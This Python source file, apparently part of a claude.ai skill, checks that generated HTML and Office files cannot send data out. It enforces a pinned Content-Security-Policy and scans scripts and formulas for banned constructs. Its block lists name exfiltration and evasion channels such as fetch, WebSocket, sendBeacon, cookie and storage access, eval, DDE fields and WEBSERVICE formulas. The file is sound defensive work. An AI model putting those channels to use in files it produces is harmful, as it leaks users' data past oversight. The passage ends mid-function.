#!/usr/bin/env python3
"""Exit 0 if each file can send no data out (AIPM no-egress rule), else print each violation and exit 1.

What the browser enforces (the CSP) and what this script enforces are different things:
  * Fetch-type loads (scripts, styles, fonts, images, media, XHR/fetch, frames, forms, workers) are blocked by the
    CSP meta tag the page must carry. This script's job for those is to PROVE THE CSP IS IN FORCE: the document is
    strict UTF-8 with no control bytes, declares utf-8 only, has no duplicate attributes, no CDATA/PI/odd declarations,
    and the CSP meta is the second element in <head>, with the exact directives and the exact pinned URLs.
  * Navigation (location, window.open, programmatic clicks, meta refresh), WebRTC and browser storage have NO CSP
    control. For those this script scans script text for the APIs. That is guidance against mistakes, not a guarantee
    against a hostile author; SKILL.md says so.
docx/pptx/xlsx: no external non-hyperlink relationships, OLE, ActiveX, web extensions, data connections, macros, or
fetching field codes and formulas. pdf: no JavaScript, Launch, SubmitForm, ImportData, GoToR/E, XFA, rendition,
URL file specifications, or open/additional actions. Stdlib only, so it runs in claude.ai's sandbox.

Usage: check_egress.py [--exempt-account EMAIL] [--stdin NAME] FILE...
       check_egress.py --head [PINNED_URL...] [--google-fonts]   print the exact head block for those pinned assets
"""
import json, os, re, shutil, subprocess, sys, zipfile
import xml.etree.ElementTree as ET
from html.parser import HTMLParser
from pathlib import Path
from urllib.parse import urlsplit

# Must match SKILL.md and hooks/register.ts.
CDN_HOSTS = {"cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com"}
GFONTS_CSS, GFONTS_FILES = "fonts.googleapis.com", "fonts.gstatic.com"
VERSION = r"\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.]+)?"
# Pinned-version paths only: cdnjs /ajax/libs/<lib>/<ver>/<file>, jsDelivr /npm/<pkg>@<ver>/<file>, unpkg /<pkg>@<ver>/<file>.
SEG = r"[A-Za-z0-9._~+-]+"  # one path segment; no '@', no '/', no escapes
PINNED_PATH = {
    "cdnjs.cloudflare.com": re.compile(rf"^/ajax/libs/{SEG}/{VERSION}/(?:{SEG}/)*{SEG}$"),
    "cdn.jsdelivr.net": re.compile(rf"^/npm/(?:@{SEG}/)?{SEG}@{VERSION}/(?:{SEG}/)*{SEG}$"),
    "unpkg.com": re.compile(rf"^/(?:@{SEG}/)?{SEG}@{VERSION}/(?:{SEG}/)*{SEG}$"),
}
PLAIN_PATH = re.compile(r"^[A-Za-z0-9._~/@+-]+$")  # CSP compares paths literally; keep pinned URLs free of escapes
SRI = re.compile(r"^sha(256|384|512)-[A-Za-z0-9+/]+={0,2}$")
FIXED_CSP = {  # every directive except script-src/style-src is verbatim; those two are computed from the pinned tags
    "default-src": ["'none'"], "font-src": ["data:", f"https://{GFONTS_FILES}/s/"], "img-src": ["data:", "blob:"],  # font-src path prefix: Google's font files only
    "media-src": ["data:", "blob:"], "connect-src": ["'none'"], "form-action": ["'none'"], "frame-src": ["'none'"],
    "object-src": ["'none'"], "base-uri": ["'none'"],
}
ASCII_WS = re.compile(r"[\t\n\f\r ]+")
DIRECTIVE = re.compile(r"^[A-Za-z0-9-]+$")
BANNED_JS = re.compile(
    # network and side channels the CSP does not fully cover
    r"\bfetch\s*\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
    r"\bimport\s*\(|importScripts|\bnew\s+(?:Shared)?Worker\b|\bWorker\s*\(|SharedWorker|\bnavigator\s*\[|"
    r"\bnavigator\s*\.\s*(?!(?:language|languages|userAgent|platform|onLine|hardwareConcurrency|maxTouchPoints|clipboard\s*\.\s*writeText)\b)|"
    r"\bclaude\s*[.\[]|"  # the claude.ai Artifact runtime API talks to the network on the page's behalf
    # navigation: no CSP directive governs it
    r"\b(?:window|document|self|top|parent|globalThis|this)\s*\.\s*location\b|(?<![.\w$\]])location\s*[.=\[]|"
    r"\.location\s*(?:=(?!=)|\[|\.\s*(?:href|assign|replace|reload|protocol|host|hostname|port|pathname|search|hash)\b)|"
    r"defaultView|\bnavigation\s*[.\[]|\bassign\s*\(\s*(?:window|self|this|globalThis|top|parent|document|location)\b|"
    r"(?<![.\w$])(?<!function )open\s*[.(\[]|\b(?:window|self|globalThis|top|parent|this|frames)\s*\.\s*open\s*[.(\[]|\.click\b|dispatchEvent|\.submit\s*\(|requestSubmit|document\.write|"
    r"(?i:http-equiv|\bequiv\b|<meta)|"
    # element creation the exact-URL CSP cannot fully police (query strings on an allowed URL, meta refresh)
    r"createElement\s*\(\s*[`'\"]\s*(?:script|link|meta|base|iframe|frame|object|embed|form)\b|\.src\s*=(?!=)|"
    r"setAttribute\s*\(\s*[`'\"]\s*(?:src|srcset|href|action|formaction|ping|poster|data|http-equiv|content)\b|"
    # storage
    r"localStorage|sessionStorage|indexedDB|document\.cookie|\bcaches\b|openDatabase|requestFileSystem|"
    # computed property access and code generation used to hide any of the above
    r"\b(?:window|self|globalThis|document|top|parent|frames|this)\s*\[|\beval\b|\bFunction\s*\(|fromCharCode|\bwith\s*\(|"
    r"\bReflect\b|\bprototype\b|String\.raw|['\"]\s*\+\s*['\"]|\$\{\s*['\"`]"
)
GF_QUERY_KEYS = {"family", "display"}
# css2: Family+Name[:axis,list@values;...]; css (v1): Family:400,700|Other. Font-name-shaped strings only; no text= subsetting.
GF_FAMILY = re.compile(r"^[A-Za-z0-9+]{1,40}(?::[a-z,]{1,40}@[0-9;,.-]{1,80}|:[0-9a-z,]{1,40})?$")
RAW_ELEMS = {"script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes", "noscript", "plaintext"}
URL_ATTRS = {"href", "src", "srcset", "imagesrcset", "action", "formaction", "data", "poster", "ping", "xlink:href",
             "background", "cite", "longdesc", "manifest", "codebase", "archive", "usemap"}
CSS_URL = re.compile(r"(?:url|image-set|image)\(\s*['\"]?([^'\")]+)", re.I)
CSS_IMPORT = re.compile(r"@import\s+(?:url\(\s*(?:\"([^\"\n]*)\"|'([^'\n]*)'|([^\s\"'()]*))\s*\)|\"([^\"\n]*)\"|'([^'\n]*)')", re.I)
VOID = {"area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"}
SVG_LEAF = {"circle", "ellipse", "line", "path", "polygon", "polyline", "rect", "use", "stop", "image", "animate",
            "animatemotion", "animatetransform", "set", "mpath", "view", "g", "text", "tspan", "textpath", "defs",
            "symbol", "marker", "pattern", "mask", "filter", "clippath", "lineargradient", "radialgradient", "switch"}
BANNED_TAGS = {"iframe", "frame", "frameset", "object", "embed", "applet", "base", "form", "noscript", "template",
               "plaintext", "xmp", "listing", "noembed", "noframes", "math", "foreignobject", "portal", "fencedframe"}
LINK_RELS_OK = {"stylesheet", "preconnect", "dns-prefetch", "icon"}
# Element attributes that make the browser fetch something. Only data:/blob: may appear in them (plus the pinned cases).
FETCH_ATTRS = {("script", "src"), ("link", "href"), ("img", "src"), ("img", "srcset"), ("source", "src"),
               ("source", "srcset"), ("video", "src"), ("video", "poster"), ("audio", "src"), ("track", "src"),
               ("input", "src"), ("input", "formaction"), ("button", "formaction"), ("body", "background"),
               ("use", "href"), ("use", "xlink:href"), ("image", "href"), ("image", "xlink:href"),
               ("feimage", "href"), ("feimage", "xlink:href"), ("a", "ping"), ("area", "ping"), ("link", "imagesrcset")}
LINK_ATTRS = {("a", "href"), ("a", "xlink:href"), ("area", "href")}
CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]")
# Characters Python's \s treats as whitespace but browsers do not: an attribute separator or a comment close built from
# one of these reads as markup to the scanner and as text to the browser.
NONASCII_WS = re.compile("[\u0085\u00a0\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\ufeff]")
# Constructs browsers and html.parser (3.9 through 3.14) read differently; refuse them outright.
RAWTEXT = r"(?:script|style|textarea|title|xmp|iframe|noembed|noframes|noscript|plaintext)"
RAW_REFUSE = [(re.compile(rf"</{RAWTEXT}(?![\t\n\f\r ]*>)", re.I), "malformed raw-text end tag (</script x>, </style x>, …)"),
              (re.compile(r"</\s"), "'</' followed by whitespace (a bogus comment to browsers, an end tag to some scanners)"),
              (re.compile(r"<!---?>"), "abrupt comment close (<!--> or <!--->)"),
              (re.compile(r"--!>"), "comment closed with --!>"), (re.compile(r"<!\["), "CDATA or marked section"),
              (re.compile(r"<\?"), "processing instruction")]
TAG = re.compile(r"</?[A-Za-z][^<>]*>")
QUOTED = re.compile(r'"[^"]*"|\'[^\']*\'')
COMMENT = re.compile(r"<!--(.*?)(?:-->|--!>)", re.S)  # the browser's comment extent
COMMENT_EARLY_CLOSE = re.compile(r"--\s+>")  # Python 3.9 closes a comment here; browsers do not
WS = r"[\t\n\f\r ]*"
CSP_CHARS = r"[\x20\x21\x23-\x25\x27-\x3b\x3d\x3f-\x7e]*"  # printable ASCII minus " & < >
# The document must begin with the generated head block verbatim, so that every parser sees the same CSP in <head>.
CMT = rf"(?:<!--(?:[\t\n\f\r\x20\x22-\x2c\x2e-\x3b\x3d\x3f-\x7e\u2013\u2014\u00b7]|-(?!-))*-->{WS})*"  # plain comments: no '--', '<', '>', '!'
VIEWPORT = r'<meta name="viewport" content="[A-Za-z0-9=,.: -]*"'
HEAD_PREFIX = re.compile(
    rf"^{WS}{CMT}<!doctype html>{WS}{CMT}(?:<html(?:[\t\n\f\r ]+(?:lang|dir|class|id)=\"[A-Za-z0-9 _-]*\")*>{WS}{CMT})?<head>{WS}{CMT}"
    rf"<meta charset=\"utf-8\"{WS}/?>{WS}{CMT}(?:{VIEWPORT}{WS}/?>{WS}{CMT})?"
    rf"<meta http-equiv=\"content-security-policy\" content=\"({CSP_CHARS})\"{WS}/?>", re.I)


def scheme_host(url):
    """('https', host) for http(s) URLs; ('data', None) for data:/blob:; ('frag', None) for # only; ('relative', None)."""
    u = url.strip("\x00-\x20").replace("\t", "").replace("\n", "").replace("\r", "")  # the URL parser's own stripping
    if not u or u.startswith("#"):
        return "frag", None
    low = u.lower()
    if low.startswith(("data:", "blob:")):
        return "data", None
    if low.startswith(("mailto:", "tel:")):
        return "mailto", None
    if low.startswith("javascript:"):
        return "javascript", None
    if u.startswith("//"):
        u = "https:" + u
    p = urlsplit(u)
    if p.scheme.lower() in ("http", "https"):
        if "\\" in u or re.search(r"\s", u) or "@" in p.netloc:  # '\' is '/' to browsers; userinfo hides the real host
            return "bad", None
        return p.scheme.lower(), (p.hostname or "").lower()
    return "relative", None


def srcset_urls(s):
    """Candidate URLs of a srcset the way the HTML spec splits them: a URL runs to whitespace (so a data: URI keeps
    its comma), then descriptors run to the next comma."""
    urls, i, n, ws = [], 0, len(s), " \t\n\f\r"
    while i < n:
        while i < n and s[i] in ws + ",":
            i += 1
        j = i
        while j < n and s[j] not in ws:
            j += 1
        if j <= i:
            break
        url = s[i:j]
        i = j
        if url.endswith(","):  # a URL ending in commas ends the candidate; descriptors are skipped
            url = url.rstrip(",")
        else:  # descriptors run to the next comma outside parentheses
            depth = 0
            while i < n:
                c = s[i]
                i += 1
                if c == "(":
                    depth += 1
                elif c == ")":
                    depth = max(0, depth - 1)
                elif c == "," and depth == 0:
                    break
        if url:
            urls.append(url)
    return urls


def pinned_source(url):
    """The CSP source for a pinned CDN URL, or an error string."""
    p = urlsplit(url)
    host = (p.hostname or "").lower()
    if p.scheme.lower() != "https" or host not in CDN_HOSTS:
        return None, f"{url} is not https on an allowed provider (cdnjs, jsDelivr npm, unpkg)"
    if p.query or p.fragment or not PINNED_PATH[host].match(p.path) or not PLAIN_PATH.match(p.path):
        return None, f"{url} is not a pinned-version path (no @latest, no GitHub mirrors, no query string)"
    segs = p.path.split("/")
    if any(x in (".", "..") for x in segs) or "." not in segs[-1].strip("."):
        return None, f"{url} must end in a file name (a trailing slash or '..' turns the CSP source into a prefix)"
    return f"https://{host}{p.path}", None


class Scan(HTMLParser):
    # Treat every raw-text/RCDATA element as raw text on every Python version (3.9 only knows script and style).
    CDATA_CONTENT_ELEMENTS = ("script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes")

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.bad, self.csp, self.referrer, self.in_script, self.in_style = [], None, 0, False, False
        self.stack, self.head_seq, self.scripts, self.styles, self.gfonts, self.csp_count = [], [], set(), set(), set(), 0
        self.other_seen = False  # anything before the CSP meta that would start the body in a browser
        self.foreign_raw = None  # <style>/<title> open inside <svg>/<math>: raw text to scanners, live markup to browsers
        self.charsets = 0

    def fail(self, msg):
        self.bad.append(f"line {self.getpos()[0]}: {msg}")

    def handle_starttag(self, tag, attrs):
        names = [k.lower() for k, _ in attrs]
        if len(set(names)) != len(names):
            self.fail(f"<{tag}> repeats an attribute (browsers keep the first, scanners differ)")
        a = {}
        for k, v in attrs:
            a.setdefault(k.lower(), v or "")  # first occurrence wins, as in the browser
        if self.csp is None:
            if tag == "head" and self.stack not in ([], ["html"]):
                self.other_seen = True
            viewport = tag == "meta" and set(a) == {"name", "content"} and a["name"].lower() == "viewport"
            if not (tag in ("html", "head") or viewport or (tag == "meta" and set(a) <= {"charset"})) and not (
                    tag == "meta" and a.get("http-equiv", "").strip().lower() == "content-security-policy"):
                self.other_seen = True  # before the CSP only <html>, <head> and <meta charset> may open
            if self.stack[-1:] == ["head"]:
                self.head_seq.append((tag, a))
        if self.foreign_raw:
            self.fail(f"markup inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live elements there")
        if tag in BANNED_TAGS:
            self.fail(f"<{tag}> is not allowed")
        if tag in RAW_ELEMS and ({"svg", "math"} & set(self.stack)):
            if tag in ("style", "title"):
                self.foreign_raw = tag
            else:
                self.fail(f"<{tag}> inside <svg>/<math> (raw text to scanners, live markup with decoded character references to browsers)")
        if tag == "link":
            rel = set(ASCII_WS.split(a.get("rel", "").strip("\t\n\f\r ").lower())) - {""}
            if not rel or not rel <= LINK_RELS_OK or "href" not in a:
                self.fail(f'<link rel="{a.get("rel", "")}"> is not allowed (only stylesheet, preconnect, dns-prefetch or icon, with href)')
        if tag in ("set", "animate", "animatetransform", "animatemotion") and "href" in a.get("attributename", "").lower():
            self.fail(f"<{tag} attributeName=href> animates a link target")
        if tag == "script" and a.get("type", "").strip().lower() == "module":
            self.fail("<script type=module> (static imports bypass SRI); use a UMD/IIFE build")
        if tag == "meta":
            self.meta(a)
        for k, v in a.items():
            if k.startswith("on") and BANNED_JS.search(v):
                self.fail(f"inline {k} handler uses {BANNED_JS.search(v).group(0).strip()!r}")
            if k == "style":
                self.check_css(v)
            if k in URL_ATTRS and scheme_host(v)[0] == "javascript":
                self.fail(f"javascript: URL in {k}")
            if k in URL_ATTRS and scheme_host(v)[0] == "bad":
                self.fail(f"{k} URL contains a backslash, '@' or whitespace (browsers and scanners resolve it to different hosts)")
        for (t, attr) in LINK_ATTRS:
            if tag == t and attr in a and scheme_host(a[attr])[0] in ("http", "https"):
                if not {"noopener", "noreferrer"} <= set(ASCII_WS.split(a.get("rel", "").strip("\t\n\f\r ").lower())):
                    self.fail(f'<{tag} {attr}="{a[attr]}"> needs rel="noopener noreferrer"')
        for (t, attr) in FETCH_ATTRS:
            if tag == t and attr in a:
                for url in (srcset_urls(a[attr]) if attr in ("srcset", "imagesrcset") else [a[attr]]):
                    self.fetch(tag, attr, url, a)
        if tag not in VOID:
            self.stack.append(tag)
        if tag == "script":
            self.in_script = True
        if tag == "style":
            self.in_style = True

    def meta(self, a):
        he = a.get("http-equiv", "").lower()  # browsers compare ASCII case-insensitively and do not trim
        if "charset" in a:
            self.charsets += 1
            if a["charset"].lower() != "utf-8":
                self.fail(f"charset {a['charset']!r}; only utf-8 is allowed (legacy encodings re-tokenise the markup)")
            if self.charsets > 1:
                self.fail("charset declared more than once")
        if he == "content-security-policy":
            self.csp_count += 1
            if self.csp_count > 1:
                self.fail("more than one Content-Security-Policy meta tag")
            self.csp = a.get("content", "")
        elif "http-equiv" in a:
            self.fail(f'http-equiv="{he}" is not allowed (only Content-Security-Policy; content-type and refresh are refused)')
        if a.get("name", "").strip().lower() == "referrer":
            self.referrer += 1
            if a.get("content", "").strip().lower() != "no-referrer":
                self.fail('referrer meta must be content="no-referrer"')

    def fetch(self, tag, attr, url, a):
        kind, host = scheme_host(url)
        if kind in ("data", "frag"):
            return
        if kind == "relative" or kind == "mailto":
            self.fail(f'<{tag} {attr}="{url}"> is a relative file reference; the document must be self-contained')
            return
        if kind == "http":
            self.fail(f"<{tag} {attr}> uses http://; only https:// pinned providers are allowed")
            return
        if kind in ("bad", "javascript"):
            return  # already reported by handle_starttag
        rel = set(a.get("rel", "").lower().split())
        if tag == "script" or (tag == "link" and "stylesheet" in rel):
            if tag == "link" and host == GFONTS_CSS:
                self.google_fonts(url)
                return
            src, err = pinned_source(url)
            if err:
                self.fail(f"<{tag}> {err}")
                return
            if not SRI.match(a.get("integrity", "")) or a.get("crossorigin", "").strip().lower() not in ("", "anonymous") or "crossorigin" not in a:
                self.fail(f'<{tag}> {url} needs integrity="sha384-…" and crossorigin="anonymous"')
            (self.scripts if tag == "script" else self.styles).add(src)
        elif tag == "link" and {"preconnect", "dns-prefetch"} & rel:
            if host not in CDN_HOSTS | {GFONTS_CSS, GFONTS_FILES}:
                self.fail(f"<link rel=preconnect> to {host}, not an allowed provider")
        elif tag == "link":
            self.fail(f"<link rel=\"{a.get('rel', '')}\"> to {host}; only stylesheet/preconnect to allowed providers, or data: icons")
        else:
            self.fail(f"<{tag} {attr}> points at {host}; images and media must be inline data: URIs")

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)
        if tag in SVG_LEAF or tag.startswith("fe"):
            self.handle_endtag(tag)
        elif tag not in VOID:
            self.fail(f"<{tag}/> self-closing syntax on a non-void element; the browser leaves it open")

    def handle_endtag(self, tag):
        if self.csp is None:
            self.other_seen = True  # any end tag before the CSP; browsers turn </br> into <br>, which opens the body
        if self.foreign_raw:
            if tag == self.foreign_raw:
                self.foreign_raw = None
            else:
                self.fail(f"markup inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live elements there")
        if tag == "script":
            self.in_script = False
        if tag == "style":
            self.in_style = False
        if tag in self.stack:
            del self.stack[len(self.stack) - 1 - self.stack[::-1].index(tag):]

    def handle_data(self, data):
        if self.csp is None and data.strip("\t\n\f\r "):  # HTML whitespace only; &nbsp; is text and starts the body
            self.other_seen = True
        if self.in_script:
            for tok in script_bans(data):
                self.fail(f"script uses {tok!r} (network, navigation, storage or obfuscation){HINTS.get(tok.split()[0].strip('.=([').lower(), '')}")
        if self.in_script and re.search(r"<!--|<script", data, re.I):
            self.fail("script text contains <!-- or <script (script-data escape states differ between parsers)")
        if self.foreign_raw and re.search(r"[<&]", data):
            self.fail(f"'<' or '&' inside <{self.foreign_raw}> within <svg>/<math>; browsers parse it as live markup there")
        if self.in_style:
            self.check_css(data)

    def handle_comment(self, data):
        if self.foreign_raw:
            self.fail(f"comment inside <{self.foreign_raw}> within <svg>/<math>")

    def handle_decl(self, decl):
        if decl.strip().lower() != "doctype html":
            self.fail(f"declaration <!{decl[:30]}> is not allowed")

    def unknown_decl(self, data):
        self.fail(f"marked section <![{data[:20]}…> is not allowed")

    def handle_pi(self, data):
        self.fail("processing instruction is not allowed")

    def google_fonts(self, url):
        u = urlsplit(url)
        if u.path not in ("/css", "/css2"):
            self.fail(f"Google Fonts stylesheet must be /css or /css2, not {u.path}")
        for part in u.query.split("&"):
            k, _, v = part.partition("=")
            if part and not ((k == "family" and all(GF_FAMILY.match(x) for x in v.split("|")))
                             or (k == "display" and v in ("auto", "block", "swap", "fallback", "optional"))):
                self.fail(f"Google Fonts query may only carry family= and display= ({part[:40]!r} is not a font name)")
        self.gfonts.add(f"https://{GFONTS_CSS}{u.path}")

    def check_css(self, css):
        if "\\" in css:
            self.fail("CSS contains a backslash escape (it can spell url( past a scanner)")
        spans = []
        for at in re.finditer(r"@import", css, re.I):
            m = CSS_IMPORT.match(css, at.start())
            url = next((g for g in (m.groups() if m else ()) if g is not None), None)
            kind, host = scheme_host(url) if url is not None else ("bad", None)
            if self.in_style and kind == "https" and host == GFONTS_CSS:
                self.google_fonts(url)  # the complete URL, validated like the <link>
                spans.append(m.span())
            else:
                self.fail("@import is allowed only for the Google Fonts stylesheet, written @import url(\"https://fonts.googleapis.com/css2?…\")")
                return
        for m in CSS_URL.finditer(css):
            if any(a <= m.start() < b for a, b in spans):
                continue
            if scheme_host(m.group(1))[0] not in ("data", "frag"):
                self.fail("CSS may only reference data: URIs (web fonts come through the Google Fonts stylesheet, not page CSS)")


HINTS = {
    "location": "; rename a variable or data field called location (for example site)",
    "click": "; for a download use exactly: const a = document.createElement(\"a\"); a.download = \"x.csv\"; a.href = URL.createObjectURL(blob); a.click(); (never appended to the page, href set last)",
    "open": "; rename a function called open, or use a visible link with rel=\"noopener noreferrer\"",
}


# The one allowed scripted click: a CSV/XLSX download from a link that is never attached to the page. A detached
# element has no event path, so no listener can rewrite it, and the href is set last, so nothing runs between
# setting it and the click. Matched as one fixed statement sequence, not by guessing at data flow.
_ID = r"[A-Za-z_$][\w$]*"
_ARGS = r"(?:[^;\n{}]|\{[^;\n{}]*\})*"  # one statement's expression: no ';', no newline, braces one level deep
_END = r"[ \t]*(?:;[ \t]*\n?|\n)\s*"
_LIT = r"(?:\"[^\"\n\\]*\"|'[^'\n\\]*')"  # plain string literal, no escapes
_A = r"(?P=A)(?![\w$])"
DOWNLOAD_TEMPLATE = re.compile(
    rf"(?:const\s+(?P<U>{_ID})\s*=\s*URL\s*\.\s*createObjectURL\s*\({_ARGS}\){_END})?"
    rf"const\s+(?P<A>{_ID})\s*=\s*document\s*\.\s*createElement\s*\(\s*(?P<Q>['\"`])a(?P=Q)\s*\){_END}"
    rf"(?:(?:{_A}\s*\.\s*(?:download|style\s*\.\s*\w+|rel)\s*=\s*{_ARGS}"
    rf"|{_A}\s*\.\s*setAttribute\s*\(\s*['\"`]download['\"`]\s*,{_ARGS}\)"
    rf"|const\s+(?P<V>{_ID})\s*=\s*URL\s*\.\s*createObjectURL\s*\({_ARGS}\)){_END})*"
    rf"{_A}\s*\.\s*href\s*=\s*(?:URL\s*\.\s*createObjectURL\s*\({_ARGS}\)|(?:(?P=U)|(?P=V))(?![\w$])|(?P<D>['\"])data:[^'\"`\n$\\]*(?P=D)(?:\s*\+\s*encodeURIComponent\s*\(\s*{_ID}\s*\))?){_END}"
    rf"(?:{_A}\s*\.\s*download\s*=\s*{_LIT}{_END})?"
    rf"{_A}\s*\.\s*click\s*\(\s*\)")
# A download template is only trustworthy if nothing rebinds or wraps what it calls.
DOWNLOAD_POISON = re.compile(
    r"createObjectURL\s*=(?!=)|createElement\s*=(?!=)|\.\s*URL\s*=(?!=)|(?<![\w$.])URL\s*=(?!=)|"
    r"\b(?:const|let|var|function|class)\s+(?:URL|document)\b|[(,]\s*(?:URL|document)\s*[,)=]|\b(?:URL|document)\s*=>|"
    r"defineProperty|defineProperties|getPrototypeOf|setPrototypeOf|__proto__|__define|__lookup|getOwnPropertyDescriptor|\bProxy\b")


def download_clicks(data):
    """Offsets of '.click' tokens that end a fixed download template, or an empty set if the script could subvert it."""
    if DOWNLOAD_POISON.search(data):
        return set()
    return {m.end() - len(re.search(r"\.\s*click\s*\(\s*\)$", m.group(0)).group(0)) for m in DOWNLOAD_TEMPLATE.finditer(data)
            if re.search(r"\.\s*download\s*=|setAttribute\s*\(\s*['\"`]download", m.group(0))}


def script_bans(data):
    """Every distinct banned construct in a script, so one retry can fix them all."""
    data = data.replace("\ufeff", " ")  # JavaScript whitespace that Python's \s does not match
    hits, allowed = [], download_clicks(data)
    for m in BANNED_JS.finditer(data):
        if m.group(0) == ".click" and m.start() in allowed:
            continue
        hits.append(m.group(0).strip())
    return list(dict.fromkeys(hits))


def csp_directives(csp):
    """Parse like a browser: ';' separates directives, ASCII whitespace separates tokens, first directive wins."""
    bad, d = [], {}
    if not all(0x20 <= ord(c) < 0x7F or c in "\t\n\f\r" for c in csp):
        return ["CSP contains non-ASCII or control characters"], d
    for part in csp.split(";"):
        toks = ASCII_WS.split(part.strip("\t\n\f\r "))
        if toks == [""]:
            continue
        name = toks[0].lower()
        if not DIRECTIVE.match(name):
            bad.append(f"CSP directive name {name!r} is malformed"); continue
        if name in d:
            bad.append(f"CSP repeats {name}")
        d.setdefault(name, [re.sub(r"^https://", "https://", t, flags=re.I) for t in toks[1:]])
    return bad, d


def expected_csp(scripts, styles, gfonts):
    d = dict(FIXED_CSP)
    d["script-src"] = ["'unsafe-inline'"] + sorted(scripts)
    d["style-src"] = ["'unsafe-inline'"] + sorted(gfonts) + sorted(styles)
    return d


def csp_text(scripts=(), styles=(), gfonts=()):
    d = expected_csp(set(scripts), set(styles), set(gfonts))
    order = ["default-src", "script-src", "style-src", "font-src", "img-src", "media-src", "connect-src", "form-action",
             "frame-src", "object-src", "base-uri"]
    return "; ".join(f"{k} {' '.join(d[k])}" for k in order)


def head_block(scripts=(), styles=(), gfonts=()):
    return ('<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1">\n'
            '<meta http-equiv="Content-Security-Policy" content="'
            + csp_text(scripts, styles, gfonts) + '">\n<meta name="referrer" content="no-referrer">')


def check_csp(csp, scripts, styles, gfonts):
    if csp is None:
        return ['no <meta http-equiv="Content-Security-Policy"> tag']
    bad, d = csp_directives(csp)
    if bad:
        return bad
    want = expected_csp(scripts, styles, gfonts)
    for k, v in want.items():
        got = d.get(k)
        if got is None:
            bad.append(f"CSP lacks {k}")
        elif sorted(got) != sorted(v):
            bad.append(f"CSP {k} must be exactly: {' '.join(v)} (got: {' '.join(got) or 'nothing'})")
    for k in d:
        if k not in want:
            bad.append(f"CSP has an extra directive {k}")
    return bad


def check_html(text):
    bad = []
    if CONTROL.search(text):
        return ["control characters in the document (legacy-encoding escapes re-tokenise the markup)"]
    for t in TAG.finditer(text):
        if (m := NONASCII_WS.search(QUOTED.sub("", t.group(0)))):
            return [f"non-ASCII whitespace U+{ord(m.group(0)):04X} inside the tag at offset {t.start()} (browsers do not treat it "
                    "as an attribute separator; scanners may); use a plain space there"]
    for rx, why in RAW_REFUSE:
        if rx.search(text):
            bad.append(why)
    for m in COMMENT.finditer(text):
        if COMMENT_EARLY_CLOSE.search(m.group(1)):
            bad.append("comment contains '-- >' (whitespace before the close; some scanners end the comment there, browsers do not)")
    prefix = HEAD_PREFIX.match(text)
    s = Scan()
    s.feed(text)
    s.close()
    bad += s.bad
    seq = [(t, a) for t, a in s.head_seq]
    if len(seq) >= 3 and seq[1][0] == "meta" and seq[1][1].get("name", "").lower() == "viewport":
        seq = seq[:1] + seq[2:]
    ok_head = (len(seq) >= 2 and seq[0][0] == "meta" and set(seq[0][1]) == {"charset"} and seq[0][1]["charset"].lower() == "utf-8"
               and seq[1][0] == "meta" and seq[1][1].get("http-equiv", "").lower() == "content-security-policy")
    if not prefix or (s.csp is not None and (not ok_head or s.other_seen)):
        bad.append('document must start with the generated head block verbatim: <!DOCTYPE html><html …><head><meta charset="utf-8">'
                   '<meta http-equiv="Content-Security-Policy" content="…">, with nothing (not even a comment) before the CSP meta')
    elif s.csp is None:
        bad.append('no <meta http-equiv="Content-Security-Policy"> tag inside <head>')
    elif s.csp != prefix.group(1):
        bad.append("the scanner read a different CSP than the head block carries (parser differential); regenerate the head block")
    csp = prefix.group(1) if prefix else s.csp
    bad += check_csp(csp, s.scripts, s.styles, s.gfonts) if csp is not None else []
    if s.referrer != 1:
        bad.append('exactly one <meta name="referrer" content="no-referrer"> is required')
    return bad


# ---------------------------------------------------------------- OOXML
HYPERLINK_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
BAD_REL_TYPES = re.compile(r"/(vbaProject|oleObject|activeXControl|webextension|externalLink|frame|attachedTemplate|subDocument|"
                           r"mailMergeSource|queryTable|connections|control|dde)\b", re.I)
BAD_PARTS = re.compile(r"(^|/)(vbaproject|vbadata|activex|webextensions|embeddings|connections\.xml|querytables|externallinks)(/|\.|$)")
BAD_CONTENT_TYPES = re.compile(r"vbaProject|ms-office\.activeX|oleObject|macroEnabled", re.I)
FIELD = re.compile(r"INCLUDEPICTURE|INCLUDETEXT|\bIMPORT\b|\bLINK\b|\bDDE(AUTO)?\b|\bRD\b", re.I)
FORMULA = re.compile(r"WEBSERVICE\s*\(|_xlfn\.IMAGE\s*\(|\bRTD\s*\(|FILTERXML\s*\(", re.I)
MACRO_EXT = {".docm", ".dotm", ".xlsm", ".xltm", ".xlam", ".pptm", ".potm", ".ppsm", ".ppam"}
OOXML_EXT = {".docx", ".dotx", ".xlsx", ".xltx", ".pptx", ".potx", ".ppsx"}


def xml_text(data: bytes) -> str:
    if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
        return data.decode("utf-16", "ignore")
    return data.decode("utf-8", "ignore")


def local(tag):
    return tag.rsplit("}", 1)[-1]


def parse_part(n, data):
    if re.search(r"<!(DOCTYPE|ENTITY)", xml_text(data), re.I):
        return None, [f"{n}: declares a DTD or entities"]
    try:
        return ET.fromstring(data), []
    except ET.ParseError as e:
        return None, [f"{n}: unparseable XML ({e})"]


def check_rels(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for rel in root.iter():
        if local(rel.tag) != "Relationship":
            continue
        typ, mode = rel.get("Type", ""), rel.get("TargetMode", "")
        if BAD_REL_TYPES.search(typ):
            bad.append(f"{n}: relationship {typ.rsplit('/', 1)[-1]} -> {rel.get('Target', '?')}")
        elif mode.strip().lower() == "external" and typ != HYPERLINK_REL:
            bad.append(f"{n}: external {typ.rsplit('/', 1)[-1]} -> {rel.get('Target', '?')}")
    return bad


def check_word_part(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for el in root.iter():
        name = local(el.tag)
